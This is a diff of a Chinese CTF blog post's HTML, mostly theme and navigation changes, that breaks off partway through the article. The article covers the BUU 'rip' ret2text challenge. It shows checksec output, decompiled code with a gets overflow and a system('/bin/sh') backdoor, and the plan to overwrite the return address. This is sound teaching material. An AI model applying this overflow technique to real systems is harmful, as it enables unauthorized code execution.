@@ -1,442 +1,256 @@
 <!DOCTYPE html>
-<html lang="zh">
-  <head>
-    <title>
-        堆栈对齐——关于64位程序ret2text失败的溯源 - DX3906&#39;s blog
-      </title>
+<html lang="zh-CN">
+    <head>
         <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <meta name="viewport"
-      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
-    <meta name="renderer" content="webkit">
-    <meta http-equiv="Cache-Control" content="no-transform" />
-    <meta http-equiv="Cache-Control" content="no-siteapp" />
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
-    <meta name="format-detection" content="telephone=no,email=no,adress=no">
-    
-    <meta name="theme-color" content="#000000" />
-    
-    <meta http-equiv="window-target" content="_top" />
-    
-    
-    <meta name="description" content="为什么同样的栈溢出32位程序可以打通64位就不行？什么是堆栈对齐？" />
-    <meta name="generator" content="Hugo 0.108.0 with theme pure" />
-    <title>堆栈对齐——关于64位程序ret2text失败的溯源 - DX3906&#39;s blog</title>
-    
-    
-    <link rel="stylesheet" href="https://blog.dx39061.top/css/style.min.e64d754037c0ee0ec4e20ab1d6f07740ace61729bc03850559b8caa21ae4a597.css">
-    
-    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css" async> 
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css" async>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
-    <meta property="og:title" content="堆栈对齐——关于64位程序ret2text失败的溯源" />
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>堆栈对齐——关于64位程序ret2text失败的溯源 - DX3906&#39;s blog</title><meta name="Description" content="DX3906&#39;s blog"><meta property="og:title" content="堆栈对齐——关于64位程序ret2text失败的溯源" />
 <meta property="og:description" content="为什么同样的栈溢出32位程序可以打通64位就不行？什么是堆栈对齐？" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://blog.dx39061.top/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://blog.dx39061.top/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/" /><meta property="og:image" content="https://blog.dx39061.top/images/avatar.jpg"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-09-04T00:00:00+00:00" />
-<meta property="article:modified_time" content="2022-09-04T00:00:00+00:00" />
-<meta itemprop="name" content="堆栈对齐——关于64位程序ret2text失败的溯源">
-<meta itemprop="description" content="为什么同样的栈溢出32位程序可以打通64位就不行？什么是堆栈对齐？"><meta itemprop="datePublished" content="2022-09-04T00:00:00+00:00" />
-<meta itemprop="dateModified" content="2022-09-04T00:00:00+00:00" />
-<meta itemprop="wordCount" content="1601">
-<meta itemprop="keywords" content="pwn," /><meta name="twitter:card" content="summary"/>
+<meta property="article:modified_time" content="2022-09-04T00:00:00+00:00" /><meta property="og:site_name" content="DX3906&#39;s blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://blog.dx39061.top/images/avatar.jpg"/>
+
 <meta name="twitter:title" content="堆栈对齐——关于64位程序ret2text失败的溯源"/>
 <meta name="twitter:description" content="为什么同样的栈溢出32位程序可以打通64位就不行？什么是堆栈对齐？"/>
+<meta name="application-name" content="DX3906&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="DX3906&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.dx39061.top/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/" /><link rel="prev" href="https://blog.dx39061.top/2022/07/tea/" /><link rel="next" href="https://blog.dx39061.top/2022/09/top_level_interface/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "堆栈对齐——关于64位程序ret2text失败的溯源",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/blog.dx39061.top\/2022\/09\/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90\/"
+        },"genre": "posts","keywords": "pwn","wordcount":  274 ,
+        "url": "https:\/\/blog.dx39061.top\/2022\/09\/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90\/","datePublished": "2022-09-04T00:00:00+00:00","dateModified": "2022-09-04T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "DX3906"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
 
-    <!--[if lte IE 9]>
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
-      <![endif]-->
-
-    <!--[if lt IE 9]>
-        <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
-        <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
-      <![endif]-->
-  </head>
-
-  
-  
-
-  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
-    <div class="slimContent">
-      <div class="navbar-header">
-        <div class="profile-block text-center">
-          <a id="avatar" href="https://github.com/DX39061" target="_blank">
-            <img class="img-circle img-rotate" src="https://blog.dx39061.top/avatar.png" width="200" height="200">
-          </a>
-          <h2 id="name" class="hidden-xs hidden-sm">DX3906</h2>
-          <h3 id="title" class="hidden-xs hidden-sm hidden-md">吾辈所赴，是为星辰大海</h3>
-          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>xi&#39;dian university, China</small>
-        </div><div class="search" id="search-form-wrap">
-    <form class="search-form sidebar-form">
-        <div class="input-group">
-            <input type="text" class="search-form-input form-control" placeholder="搜索" />
-            <span class="input-group-btn">
-                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
-                        class="icon icon-search"></i></button>
-            </span>
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="DX3906&#39;s blog"><span id="id-1" class="typeit"></span></a>
         </div>
-        <div class="ins-search">
-            <div class="ins-search-mask"></div>
-            <div class="ins-search-container">
-                <div class="ins-input-wrapper">
-                    <input type="text" class="ins-search-input" placeholder="想要查找什么..."
-                        x-webkit-speech />
-                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
-                        aria-label="Close"><span aria-hidden="true">×</span></button>
-                </div>
-                <div class="ins-section-wrapper">
-                    <div class="ins-section-container"></div>
-                </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/">< 归档 ></a><a class="menu-item" href="/tags/">< 标签 ></a><a class="menu-item" href="/categories/">< 分类 ></a><a class="menu-item" href="/links">< 友链 ></a><a class="menu-item" href="/about">< 关于 ></a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="DX3906&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
             </div>
         </div>
-    </form>
-</div>
-        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
-          <span class="sr-only">Toggle navigation</span>
-          <span class="icon-bar"></span>
-          <span class="icon-bar"></span>
-          <span class="icon-bar"></span>
-        </button>
-      </div>
-      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
-        <ul class="nav navbar-nav main-nav">
-            <li class="menu-item menu-item-home">
-                <a href="/">
-                    <i class="icon icon-home-fill"></i>
-                  <span class="menu-title">Home</span>
-                </a>
-            </li>
-            <li class="menu-item menu-item-archives">
-                <a href="/posts/">
-                    <i class="icon icon-archives-fill"></i>
-                  <span class="menu-title">Archives</span>
-                </a>
-            </li>
-            <li class="menu-item menu-item-categories">
-                <a href="/categories/">
-                    <i class="icon icon-folder"></i>
-                  <span class="menu-title">Categories</span>
-                </a>
-            </li>
-            <li class="menu-item menu-item-tags">
-                <a href="/tags/">
-                    <i class="icon icon-tags"></i>
-                  <span class="menu-title">Tags</span>
-                </a>
-            </li>
-            <li class="menu-item menu-item-about">
-                <a href="/about/">
-                    <i class="icon icon-cup-fill"></i>
-                  <span class="menu-title">About</span>
-                </a>
-            </li>
-            <li class="menu-item menu-item-links">
-                <a href="/links/">
-                    <i class="icon icon-friendship"></i>
-                  <span class="menu-title">Links</span>
-                </a>
-            </li>
-        </ul>
-      </nav>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><归档></a><a class="menu-item" href="/tags/" title=""><标签></a><a class="menu-item" href="/categories/" title=""><分类></a><a class="menu-item" href="/links" title=""><友链></a><a class="menu-item" href="/about" title=""><关于></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
     </div>
-  </header>
-
-<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
-  <div class="slimContent">
-    
-      <div class="widget">
-    <h3 class="widget-title">公告</h3>
-    <div class="widget-body">
-        <div id="board">
-            <div class="content"><p>hello, hugo</p>
-            </div>
-        </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
     </div>
-</div>
-
-      
-<div class="widget">
-    <h3 class="widget-title">最新文章</h3>
-    <div class="widget-body">
-        <ul class="recent-post-list list-unstyled no-thumbnail">
-            <li>
-                <div class="item-inner">
-                    <p class="item-title">
-                        <a href="https://blog.dx39061.top/2023/01/catctf-catfly-wp/" class="title">NepnepxCatCTF Reverse CatFly WriteUp</a>
-                    </p>
-                    <p class="item-date">
-                        <time datetime="2023-01-01 00:00:00 &#43;0000 UTC" itemprop="datePublished">2023-01-01</time>
-                    </p>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">堆栈对齐——关于64位程序ret2text失败的溯源</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/DX39061" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>DX3906</a></span>&nbsp;<span class="post-category">included in <a href="/categories/binary/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Binary</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-09-04">2022-09-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;274 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                 </div>
-            </li>
-            <li>
-                <div class="item-inner">
-                    <p class="item-title">
-                        <a href="https://blog.dx39061.top/2022/12/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9Bgodeep-wp/" class="title">春秋杯冬季赛godeep wp</a>
-                    </p>
-                    <p class="item-date">
-                        <time datetime="2022-12-26 00:00:00 &#43;0000 UTC" itemprop="datePublished">2022-12-26</time>
-                    </p>
-                </div>
-            </li>
-            <li>
-                <div class="item-inner">
-                    <p class="item-title">
-                        <a href="https://blog.dx39061.top/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/" class="title">可执行文件概述和ssh使用简介</a>
-                    </p>
-                    <p class="item-date">
-                        <time datetime="2022-12-23 00:28:04 &#43;0800 CST" itemprop="datePublished">2022-12-23</time>
-                    </p>
-                </div>
-            </li>
-            <li>
-                <div class="item-inner">
-                    <p class="item-title">
-                        <a href="https://blog.dx39061.top/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/" class="title">ret跳转的简单控制流混淆</a>
-                    </p>
-                    <p class="item-date">
-                        <time datetime="2022-12-14 02:27:58 &#43;0800 CST" itemprop="datePublished">2022-12-14</time>
-                    </p>
-                </div>
-            </li>
-            <li>
-                <div class="item-inner">
-                    <p class="item-title">
-                        <a href="https://blog.dx39061.top/2022/12/nctf2022-ccccha-wp/" class="title">NCTF2022 ccccha 花指令/混淆 详解</a>
-                    </p>
-                    <p class="item-date">
-                        <time datetime="2022-12-10 02:51:35 &#43;0800 CST" itemprop="datePublished">2022-12-10</time>
-                    </p>
-                </div>
-            </li>
-        </ul>
-    </div>
-</div>
-      <div class="widget">
-    <h3 class="widget-title"> 分类</h3>
-    <div class="widget-body">
-        <ul class="category-list">
-            <li class="category-list-item"><a href="https://blog.dx39061.top/categories/angr/" class="category-list-link">angr</a><span class="category-list-count">7</span></li>
-            <li class="category-list-item"><a href="https://blog.dx39061.top/categories/binary/" class="category-list-link">binary</a><span class="category-list-count">11</span></li>
-            <li class="category-list-item"><a href="https://blog.dx39061.top/categories/crypto/" class="category-list-link">crypto</a><span class="category-list-count">3</span></li>
-            <li class="category-list-item"><a href="https://blog.dx39061.top/categories/dev/" class="category-list-link">dev</a><span class="category-list-count">4</span></li>
-            <li class="category-list-item"><a href="https://blog.dx39061.top/categories/life/" class="category-list-link">life</a><span class="category-list-count">1</span></li>
-            <li class="category-list-item"><a href="https://blog.dx39061.top/categories/linux/" class="category-list-link">linux</a><span class="category-list-count">1</span></li>
-            <li class="category-list-item"><a href="https://blog.dx39061.top/categories/writeups/" class="category-list-link">writeups</a><span class="category-list-count">10</span></li>
-        </ul>
-    </div>
-</div>
-      <div class="widget">
-    <h3 class="widget-title"> 标签</h3>
-    <div class="widget-body">
-        <ul class="tag-list">
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/angr/" class="tag-list-link">angr</a><span
-                    class="tag-list-count">7</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/assembly/" class="tag-list-link">assembly</a><span
-                    class="tag-list-count">1</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/binary/" class="tag-list-link">binary</a><span
-                    class="tag-list-count">1</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/cpp/" class="tag-list-link">cpp</a><span
-                    class="tag-list-count">1</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/crack/" class="tag-list-link">crack</a><span
-                    class="tag-list-count">1</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/crypto/" class="tag-list-link">crypto</a><span
-                    class="tag-list-count">3</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/ctf/" class="tag-list-link">ctf</a><span
-                    class="tag-list-count">10</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/executable/" class="tag-list-link">executable</a><span
-                    class="tag-list-count">1</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/git/" class="tag-list-link">git</a><span
-                    class="tag-list-count">1</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/life/" class="tag-list-link">life</a><span
-                    class="tag-list-count">1</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/linux/" class="tag-list-link">linux</a><span
-                    class="tag-list-count">4</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/misc/" class="tag-list-link">misc</a><span
-                    class="tag-list-count">1</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/misunderstanding/" class="tag-list-link">misunderstanding</a><span
-                    class="tag-list-count">1</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/obfuscation/" class="tag-list-link">obfuscation</a><span
-                    class="tag-list-count">1</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/oop/" class="tag-list-link">oop</a><span
-                    class="tag-list-count">1</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/pwn/" class="tag-list-link">pwn</a><span
-                    class="tag-list-count">1</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/python/" class="tag-list-link">python</a><span
-                    class="tag-list-count">2</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/reverse/" class="tag-list-link">reverse</a><span
-                    class="tag-list-count">24</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/ssh/" class="tag-list-link">ssh</a><span
-                    class="tag-list-count">1</span></li>
-            
-            
-            <li class="tag-list-item"><a href="https://blog.dx39061.top/tags/windows/" class="tag-list-link">windows</a><span
-                    class="tag-list-count">1</span></li>
-            
-        </ul>
-
-    </div>
-</div>
-  </div>
-</aside>
-
-    
-    
-<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
-  <div class="slimContent">
-    <h4 class="toc-title">文章目录</h4>
-    <nav id="toc" class="js-toc toc">
-
-    </nav>
-  </div>
-</aside>
-<main class="main" role="main"><div class="content">
-  <article id="-" class="article article-type-" itemscope
-    itemtype="http://schema.org/BlogPosting">
-    
-    <div class="article-header">
-      <h1 itemprop="name">
-  <a
-    class="article-title"
-    href="/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/"
-    >堆栈对齐——关于64位程序ret2text失败的溯源</a
-  >
-</h1>
-
-      <div class="article-meta">
-        
-<span class="article-date">
-  <i class="icon icon-calendar-check"></i>&nbsp;
-<a href="https://blog.dx39061.top/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/" class="article-date">
-  <time datetime="2022-09-04 00:00:00 &#43;0000 UTC" itemprop="datePublished">2022-09-04</time>
-</a>
-</span>
-<span class="article-category">
-  <i class="icon icon-folder"></i>&nbsp;
-  <a class="article-category-link" href="/categories/binary/"> Binary </a>
-</span>  
-  <span class="article-tag">
-    <i class="icon icon-tags"></i>&nbsp;
-    <a class="article-tag-link" href="/tags/pwn/"> pwn </a>
-  </span>
-
-	<span class="article-read hidden-xs">
-	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
-	    <span id="busuanzi_container_page_pv">
-			<span id="busuanzi_value_page_pv">0</span>
-		</span>
-	</span>
-        <span class="post-comment"><i class="icon icon-comment"></i>&nbsp;<a href="/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/#comments"
-            class="article-comment-link">评论</a></span>
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 1601字</span>
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 4分 </span>
-      </div>
-    </div>
-    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
-      <h2 id="起">起</h2>
-<p>以一道简单的pwn题说明，题目参见<a href="https://buuoj.cn/challenges#rip">BUU-rip</a></p>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#起">起</a></li>
+    <li><a href="#承">承</a></li>
+    <li><a href="#转">转</a></li>
+    <li><a href="#合">合</a></li>
+    <li><a href="#ref">Ref</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="起">起</h2>
+<p>以一道简单的pwn题说明，题目参见<a href="https://buuoj.cn/challenges#rip" target="_blank" rel="noopener noreffer ">BUU-rip</a></p>
 <ul>
 <li>查看保护信息，啥都没开，amd64</li>
 </ul>
-<pre><code class="language-shell">❯ checksec ./pwn1
-[*] '/home/dx3906/CTF/problem/pwn/buu/rip/pwn1'
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX disabled
-    PIE:      No PIE (0x400000)
-    RWX:      Has RWX segments
-</code></pre>
-<ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ checksec ./pwn1
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/dx3906/CTF/problem/pwn/buu/rip/pwn1&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX disabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    RWX:      Has RWX segments
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
 <li>运行</li>
 </ul>
-<pre><code class="language-shell">❯ ./pwn1
-please input
-abc
-abc
-ok,bye!!!
-</code></pre>
-<ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ ./pwn1
+</span></span><span class="line"><span class="cl">please input
+</span></span><span class="line"><span class="cl">abc
+</span></span><span class="line"><span class="cl">abc
+</span></span><span class="line"><span class="cl">ok,bye!!!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
 <li>拖入ida</li>
 </ul>
-<pre><code class="language-c">// main
-int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  char s[15]; // [rsp+1h] [rbp-Fh] BYREF
-
-  puts(&quot;please input&quot;);
-  gets((__int64)s, (__int64)argv);
-  puts(s);
-  puts(&quot;ok,bye!!!&quot;);
-  return 0;
-}
-// backdoor
-int fun()
-{
-  return system(&quot;/bin/sh&quot;);
-}
-// fun 汇编
-.text:0000000000401186 fun             proc near
-.text:0000000000401186 ; __unwind {
-.text:0000000000401186                 push    rbp
-.text:0000000000401187                 mov     rbp, rsp
-.text:000000000040118A                 lea     rdi, command    ; &quot;/bin/sh&quot;
-.text:0000000000401191                 call    _system         ; Call Procedure
-.text:0000000000401196                 nop                     ; No Operation
-.text:0000000000401197                 pop     rbp
-.text:0000000000401198                 retn                    ; Return Near from Procedure
-.text:0000000000401198 ; } // starts at 401186
-.text:0000000000401198 fun             endp
-</code></pre>
-<p>所以解题思路就是通过main的gets函数进行栈溢出，覆盖返回地址，跳转到fun执行得到shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// main
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">15</span><span class="p">];</span> <span class="c1">// [rsp+1h] [rbp-Fh] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;please input&#34;</span><span class="p">);</span>
